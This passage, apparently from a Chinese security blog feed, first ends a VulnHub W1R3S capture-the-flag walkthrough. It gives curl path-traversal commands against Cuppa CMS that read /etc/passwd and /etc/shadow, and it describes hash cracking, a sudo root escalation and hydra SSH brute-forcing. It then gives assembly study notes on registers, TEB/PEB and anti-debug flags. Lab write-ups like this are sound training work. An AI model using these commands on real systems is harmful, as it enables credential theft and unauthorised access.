&quot;default&quot;;<br>                public $list_limit = 25;<br>                public $token = &quot;OBqIPqlFWf3X&quot;;<br>                public $allowed_extensions = &quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;;<br>                public $upload_default_path = &quot;media/uploadsFiles&quot;;<br>                public $maximum_file_size = &quot;5242880&quot;;<br>                public $secure_login = 0;<br>                public $secure_login_value = &quot;&quot;;<br>                public $secure_login_redirect = &quot;&quot;;<br>        &#125;<br>?&gt;<br>-----------------------------------------------------------------------------<br><br>Able to read sensitive information via File Inclusion (PHP Stream)<br><br>################################################################################################################<br> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2<br>################################################################################################################                                                                                                                 <br></code></pre></td></tr></table></figure><h4 id="cVh6d">路径构造  （EXP）</h4><p><img src="/../img/vulnhub-w1r3s.md/15.png"></p><p><strong>可以看到需要 post 请求</strong></p><p><img src="/../img/vulnhub-w1r3s.md/16.png"></p><p>–data-urlencode 对 http  post 并使用 url 编码给到处理程序</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/passwd&#x27; http://192.168.17.145/administrator/alerts/alertConfigField.php<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-w1r3s.md/17.png">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/shadow&#x27; http://192.168.17.145/administrator/alerts/alertConfigField.php<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-w1r3s.md/18.png"></p><h4 id="P3SkO">linux 下 passwd 和 shadow 的详解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs plain">/etc/passwd:<br>普通用户权限能够查看<br><br>保存用户信息，每一行代表一个用户，每一行通过冒号：分为七个部分<br><br>用户名<br>密码，x表示密码保存在/etc/shadow<br>UID，0代表root<br>GID，表示所在组<br>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other<br>用户主目录<br>默认shell类型<br>eg.<br><br>test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash<br><br>用户名：test2<br>密码保存在/etc/shadow<br>UID为1001<br>GID为1001<br>描述信息： Full Name []: test2 Room Number []: 11111 Work Phone []: 111111-11 Home Phone []: 222222-22 Other []: test<br>用户主目录为/home/test2<br>默认shell为/bin/bash<br>/etc/shadow:<br>只有root用户权限能够查看<br><br>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号：分为九个部分<br><br>用户名<br>加密后的密码<br>上次修改密码的时间(从1970.1.1开始的总天数)<br>两次修改密码间隔的最少天数，如果为0，则没有限制<br>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制<br>提前多少天警告用户密码将过期<br>在密码过期之后多少天禁用此用户<br>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用<br>保留<br>注：<br><br>参数说明可通过man shadow获取<br><br>eg.<br><br>test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::<br><br>用户名：test2<br>加密后的密码：$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0<br>上次修改密码的时间(从1970.1.1开始的总天数为17470)<br>两次修改密码间隔：没有限制<br>两次修改密码间隔最多的天数：没有限制<br>提前7天警告用户密码将过期<br>该用户永久可用<br>由示例可知，加密的密码具有固定格式：<br><br>$id$salt$encrypted<br><br>id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash<br></code></pre></td></tr></table></figure><h4 id="mwdXg">密码破解</h4>对 shadow 中加密的密码进行破解<p><img src="/../img/vulnhub-w1r3s.md/19.png"></p><h4 id="FlVKI">成功登录</h4><p><img src="/../img/vulnhub-w1r3s.md/20.png"></p><h3 id="Zyx4x">提权</h3>**sudo -l 可以查看用户的 root 权限**<p><img src="/../img/vulnhub-w1r3s.md/21.png"></p><p>w1r3s 可以运行全部的权限。相当于 root</p><p><img src="/../img/vulnhub-w1r3s.md/22.png"></p><h4 id="A3MfL">sudo /bin/bash</h4>为什么运行这个命令就可以进入 root 了呢？<p><img src="/../img/vulnhub-w1r3s.md/23.png"></p><p>:::info<br>&#x2F;bin&#x2F;bash 的作用</p><p>启动新 Shell：&#x2F;bin&#x2F;bash 是系统的 Bash Shell 解释器路径。执行此命令会启动一个新的 Bash Shell 会话。</p><p>以 root 身份运行：通过 sudo 执行时，这个新 Shell 会以 root 权限启动（因为 sudo 默认以 root 身份运行命令）。</p><p>:::</p><h4 id="j1LPa">sudo su -</h4><p><img src="/../img/vulnhub-w1r3s.md/24.png"></p><h1 id="QayxZ">22 端口</h1>正常来说 ssh 端口是没什么可测试的<h4 id="AF2eQ">字典</h4><p><img src="/../img/vulnhub-w1r3s.md/25.png"></p><h4 id="q7m6L">hydra 成功爆破</h4>**ssh 可以直接登录**<p><img src="/../img/vulnhub-w1r3s.md/26.png"></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>ftp匿名登录</tag>
      
      <tag>base64</tag>
      
      <tag>md5</tag>
      
      <tag>gobuster目录扫描</tag>
      
      <tag>dirb目录扫描</tag>
      
      <tag>Cuppa CMS渗透</tag>
      
      <tag>searchsploit漏洞信息搜集</tag>
      
      <tag>john密码破解</tag>
      
      <tag>ssh爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编Basic</title>
    <link href="/2025/06/30/%E6%B1%87%E7%BC%96Basic%EF%BC%81/"/>
    <url>/2025/06/30/%E6%B1%87%E7%BC%96Basic%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<h3 id="数据带宽"><a href="#数据带宽" class="headerlink" title="数据带宽"></a>数据带宽</h3><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/1.png"></p><p>DWORD是单浮点</p><p>QWORD是双浮点</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/2.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/3.png"></p><h4 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/4.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/5.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/6.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/7.png"> </p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/8.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/9.png"><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/1.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/10.png"></p><h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><p>64位通用寄存器</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/11.png"></p><p>64位指令指针寄存器  RIP</p><p>64位标志寄存器    RFLAGS</p><h3 id="汇编指令基本结构"><a href="#汇编指令基本结构" class="headerlink" title="汇编指令基本结构"></a>汇编指令基本结构</h3><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>每个指令包括：操作码（MOV、ADD、SUB）和操作数（操作对象）</p><h4 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h4><p>操作数有以下几种类型：</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/12.png"></p><h4 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/13.png"></p><h3 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h3><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/14.png"> </p><h3 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h3><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/15.png"></p><p>F8：单步执行</p><p>ctrl+G：跳转到某个地址</p><p>若遇到编码问题</p><p>中文–》GBK格式</p><h3 id="FS寄存器、TEB、PEB"><a href="#FS寄存器、TEB、PEB" class="headerlink" title="FS寄存器、TEB、PEB"></a>FS寄存器、TEB、PEB</h3><p><a href="https://crackmes.cn/doc/107/">https://crackmes.cn/doc/107/</a></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/16.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/17.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/18.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>ntdll!_TEB<br>   +<span class="hljs-number">0x000</span> NtTib            : _NT_TIB  //TIB结构<br>   [+<span class="hljs-number">0x000</span>] ExceptionList    : <span class="hljs-number">0x1df360</span> [<span class="hljs-type">Type</span>: _EXCEPTION_REGISTRATION_RECORD *]//指向SEH链<br>    [+<span class="hljs-number">0x004</span>] StackBase        : <span class="hljs-number">0x1e0000</span> [<span class="hljs-type">Type</span>: void *]//堆栈基址<br>    [+<span class="hljs-number">0x008</span>] StackLimit       : <span class="hljs-number">0x1dd000</span> [<span class="hljs-type">Type</span>: void *]//堆栈大小<br>    [+<span class="hljs-number">0x00c</span>] SubSystemTib     : <span class="hljs-number">0x0</span> [<span class="hljs-type">Type</span>: void *]//<br>    [+<span class="hljs-number">0x010</span>] FiberData        : <span class="hljs-number">0x1e00</span> [<span class="hljs-type">Type</span>: void *]<br>    [+<span class="hljs-number">0x010</span>] Version          : <span class="hljs-number">0x1e00</span> [<span class="hljs-type">Type</span>: unsigned long]<br>    [+<span class="hljs-number">0x014</span>] ArbitraryUserPointer : <span class="hljs-number">0x0</span> [<span class="hljs-type">Type</span>: void *]<br>    [+<span class="hljs-number">0x018</span>] Self             : <span class="hljs-number">0x7ffde000</span> [<span class="hljs-type">Type</span>: _NT_TIB *]//指向自身的指针,也就是说Self同时是指向TEB和TIB头部的指针(因为TIB为TEB结构的第一个成员)<br>   +<span class="hljs-number">0x01c</span> EnvironmentPointer : Ptr32 Void//环境指针<br>   +<span class="hljs-number">0x020</span> ClientId         : _CLIENT_ID//CLIENT_ID结构,存储PID和当前线程ID<br>   +<span class="hljs-number">0x028</span> ActiveRpcHandle  : Ptr32 Void//活动的RPC句柄<br>   +<span class="hljs-number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void//指向线程局部存储数组<br>   +<span class="hljs-number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB//指向PEB结构<br>   +<span class="hljs-number">0x034</span> LastErrorValue   : Uint4B//保存着LastError的值<br>   +<span class="hljs-number">0x038</span> CountOfOwnedCriticalSections : Uint4B//所拥有的临界区数量<br>   +<span class="hljs-number">0x03c</span> CsrClientThread  : Ptr32 Void//指向CSR客户线程<br>   +<span class="hljs-number">0x040</span> Win32ThreadInfo  : Ptr32 Void//指向Win32线程信息<br>   +<span class="hljs-number">0x044</span> User32Reserved   : [<span class="hljs-number">26</span>] Uint4B<br>   +<span class="hljs-number">0x0ac</span> UserReserved     : [<span class="hljs-number">5</span>] Uint4B<br>   +<span class="hljs-number">0x0c0</span> WOW32Reserved    : Ptr32 Void<br>   +<span class="hljs-number">0x0c4</span> CurrentLocale    : Uint4B//当前的Locale<br>   +<span class="hljs-number">0x0c8</span> FpSoftwareStatusRegister : Uint4B//FP软件状态寄存器<br>   +<span class="hljs-number">0x0cc</span> SystemReserved1  : [<span class="hljs-number">54</span>] Ptr32 Void<br>   +<span class="hljs-number">0x1a4</span> ExceptionCode    : Int4B//异常码<br>   +<span class="hljs-number">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK//指向活动上下文栈的指针<br>   +<span class="hljs-number">0x1ac</span> SpareBytes       : [<span class="hljs-number">36</span>] UChar//空闲字节<br>   +<span class="hljs-number">0x1d0</span> TxFsContext      : Uint4B<br>   +<span class="hljs-number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH<br>   +<span class="hljs-number">0x6b4</span> RealClientId     : _CLIENT_ID<br>   +<span class="hljs-number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void<br>   +<span class="hljs-number">0x6c0</span> GdiClientPID     : Uint4B//真实的进程PID<br>   +<span class="hljs-number">0x6c4</span> GdiClientTID     : Uint4B//真实的线程TID<br>.......<br>//其他便宜<br></code></pre></td></tr></table></figure><p>TEB偏移0x30的地方指向PEB</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dt nt!_peb 7ffdd000<br>ntdll!_PEB<br>   +<span class="hljs-number">0x000</span> InheritedAddressSpace : <span class="hljs-number">0</span> <span class="hljs-string">&#x27;&#x27;</span><br>   +<span class="hljs-number">0x001</span> ReadImageFileExecOptions : <span class="hljs-number">0</span> <span class="hljs-string">&#x27;&#x27;</span><br>   +<span class="hljs-number">0x002</span> BeingDebugged    : <span class="hljs-number">0x1</span> <span class="hljs-string">&#x27;&#x27;</span>    //判断进程是否被调试，true为被调试<br>   +<span class="hljs-number">0x003</span> SpareBool        : <span class="hljs-number">0</span> <span class="hljs-string">&#x27;&#x27;</span><br>   +<span class="hljs-number">0x004</span> Mutant           : <span class="hljs-number">0xffffffff</span> Void<br>   +<span class="hljs-number">0x008</span> ImageBaseAddress : <span class="hljs-number">0x00400000</span> Void   //进程映像基址，就是PE中的IMAGE_OPTIONAL_HEADER-&gt;ImageBase对应的值。对于EXE来说，默认的ImageBase为<span class="hljs-number">0x400000</span>；对于DLL来说，它是<span class="hljs-number">0x10000000</span>，当打开ASLR时应该会变，**待验证**<br> <br>----------<br> <br>   +<span class="hljs-number">0x00c</span> Ldr              : <span class="hljs-number">0x00251ea0</span> _PEB_LDR_DATA<br> <br>    LoaderData域是PEB中一个很重要的成员域，它是一个指向PEB_LDR_DATA结构体的指针。它由PE Loader(加载器)填充，也就说，在这个指针指向的结构中，可以找到很多在PE中包含的信息。另外，我们在做Buffer OverFlow的时候经常会遇到这个数据结构，枚举用户进程加载的模块就和它密切相关。我们扩展出去，详细学习一下这个结构。<br> <br>   <span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dt _PEB_LDR_DATA <span class="hljs-number">0x00251ea0</span><br>ntdll!_PEB_LDR_DATA<br>   +<span class="hljs-number">0x000</span> Length           : <span class="hljs-number">0x28</span>       //结构长度<br>   +<span class="hljs-number">0x004</span> Initialized      : <span class="hljs-number">0x1</span> <span class="hljs-string">&#x27;&#x27;</span>     //进程是否初始化完成<br>   +<span class="hljs-number">0x008</span> SsHandle         : (null) <br>   +<span class="hljs-number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY [ <span class="hljs-number">0x251ee0</span> - <span class="hljs-number">0x252848</span> ]<br>   +<span class="hljs-number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY [ <span class="hljs-number">0x251ee8</span> - <span class="hljs-number">0x252850</span> ]<br>   +<span class="hljs-number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY [ <span class="hljs-number">0x251f58</span> - <span class="hljs-number">0x252798</span> ]<br>    //nLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList这三个域都是指向它们各自的双链表中的下一个LDR_MODULE的LIST_ENTRY<br>   +<span class="hljs-number">0x024</span> EntryInProgress  : (null) <br><br>   +<span class="hljs-number">0x000</span> MaximumLength    : <span class="hljs-number">0x1000</span>    //<br>   +<span class="hljs-number">0x004</span> Length           : <span class="hljs-number">0x7e4</span>    //结构大小<br>   +<span class="hljs-number">0x008</span> Flags            : <span class="hljs-number">0x2001</span>    //是否由RtlNormalizeProcessParams标准化<br>   +<span class="hljs-number">0x00c</span> DebugFlags       : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x010</span> ConsoleHandle    : (null)     //该进程的窗口句柄，如果有的话<br>   +<span class="hljs-number">0x014</span> ConsoleFlags     : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x018</span> StandardInput    : (null) <br>   +<span class="hljs-number">0x01c</span> StandardOutput   : <span class="hljs-number">0x00010001</span> Void<br>   +<span class="hljs-number">0x020</span> StandardError    : (null) <br>   +<span class="hljs-number">0x024</span> CurrentDirectory : _CURDIR<br>   +<span class="hljs-number">0x030</span> DllPath          : _UNICODE_STRING <span class="hljs-string">&quot;C:\Documents and Settings\Administrator\桌面;C:\WINDOWS\system32;C:\WINDOWS\system;C:\WINDOWS;.;C:\Program Files\Debugging Tools for Windows (x86)\winext\arcade;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem&quot;</span><br>   +<span class="hljs-number">0x038</span> ImagePathName    : _UNICODE_STRING <span class="hljs-string">&quot;C:\Documents and Settings\Administrator\桌面\csnbes_1.0.0.8.exe&quot;</span><br>   +<span class="hljs-number">0x040</span> CommandLine      : _UNICODE_STRING <span class="hljs-string">&quot;&quot;</span>C:\Documents <span class="hljs-keyword">and</span> Settings\Administrator\桌面\csnbes_1<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.8</span>.exe<span class="hljs-string">&quot;&quot;</span><br>   +<span class="hljs-number">0x048</span> Environment      : <span class="hljs-number">0x00010000</span> Void<br>   +<span class="hljs-number">0x04c</span> StartingX        : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x050</span> StartingY        : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x054</span> CountX           : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x058</span> CountY           : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x05c</span> CountCharsX      : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x060</span> CountCharsY      : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x064</span> FillAttribute    : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x068</span> NtGlobalFlag;    : NtGlobalFlag<br>   +<span class="hljs-number">0x06c</span> ShowWindowFlags  : <span class="hljs-number">0</span><br>   +<span class="hljs-number">0x070</span> WindowTitle      : _UNICODE_STRING <span class="hljs-string">&quot;C:\Documents and Settings\Administrator\桌面\csnbes_1.0.0.8.exe&quot;</span><br>   +<span class="hljs-number">0x078</span> DesktopInfo      : _UNICODE_STRING <span class="hljs-string">&quot;WinSta0\Default&quot;</span><br>   +<span class="hljs-number">0x080</span> ShellInfo        : _UNICODE_STRING <span class="hljs-string">&quot;&quot;</span><br>   +<span class="hljs-number">0x088</span> RuntimeData      : _UNICODE_STRING <span class="hljs-string">&quot;&quot;</span><br>   +<span class="hljs-number">0x090</span> CurrentDirectores : [<span class="hljs-number">32</span>] _RTL_DRIVE_LETTER_CURDIR<br> <br></code></pre></td></tr></table></figure><p>PEB是为了防止他人调试我发布的软件，主要使用到的地址是0x002和0x068</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/19.png"></p><p>为了避免被检测到，尽量用附加进程而不是直接拖入调试 </p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/20.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/21.png"></p><h3 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h3><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/22.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/23.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/24.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/25.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/26.png">                                        </p><h3 id="位操作指令"><a href="#位操作指令" class="headerlink" title="位操作指令"></a>位操作指令</h3><h4 id="逻辑运算指令："><a href="#逻辑运算指令：" class="headerlink" title="逻辑运算指令："></a><font style="color:rgb(77, 77, 77);">逻辑运算指令：</font></h4><ul><li><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;AND&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;OR&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;XOR&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;NOT&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;TEST&lt;/font&gt;</code></li></ul><h4 id="移位指令："><a href="#移位指令：" class="headerlink" title="移位指令："></a><font style="color:rgb(77, 77, 77);">移位指令：</font></h4><ul><li><font style="color:rgba(0, 0, 0, 0.75);">逻辑、算术移位指令：<br></font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;SHL&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;SHR&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;SAL&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;SAR&lt;/font&gt;</code></li><li><font style="color:rgba(0, 0, 0, 0.75);">循环、带进位循环移位指令：<br></font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;ROL&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;ROR&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;RCL&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);"> </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;RCR&lt;/font&gt;</code></li></ul><p><code>XOR</code> 异或指令：有且仅有一个为真，结果才为真</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/27.png"></p><p><code>NOT</code>：取反</p><p><code>SHL</code>：逻辑左移指令，整体向左移动一位，最低位用 0 填充，最高位移入进位标志位(CF)，该标志位原来的值被丢弃（举例：0110 0011–》1100 0110）</p><p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;SHR&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">：逻辑右移指令。将寄存器或内存单元的数据右移，最高位用 0 补充，最低位进入 CF</font></p><p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;ROL&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">：循环左移指令，（举例：1110 0011–》1100 0111）</font></p><p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;ROR&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">：循环右移指令</font></p><p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;sal&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">：算数左移。功能与shl相同</font></p><p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;sar&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">：算数右移。</font><font style="color:rgb(34, 34, 34);">每位右移, 低位进 CF, 高位不变</font></p><p><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;RCL&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);">: 循环左移, 进位值(原CF)到低位, 高位进 CF</font></p><p><code>&lt;font style=&quot;color:rgb(34, 34, 34);&quot;&gt;RCR&lt;/font&gt;</code><font style="color:rgb(34, 34, 34);">: 循环右移, 进位值(原CF)到高位, 低位进 CF</font></p><h3 id="逻辑比较指令"><a href="#逻辑比较指令" class="headerlink" title="逻辑比较指令"></a>逻辑比较指令</h3><h4 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h4><p>cmp：”比较”，cmp会对两个操作数进行减法运算，通过计算两个操作数的差值来影响标志位。cmp不会存储减法的结果，而是仅更新标志寄存器（如<font style="background-color:#D8DAD9;">零标志ZF、进位标志CF、符号标志SF、溢出标志OF、偶校验标志PF、辅助进位标志AF</font>），通常的比较操作数之间的关系有（大于、小于、等于）</p><p>cmp最常见的应用是与条件跳转指令（JE、JNE、JG、JL等）配合使用，以决定程序的执行流。</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/28.png"> 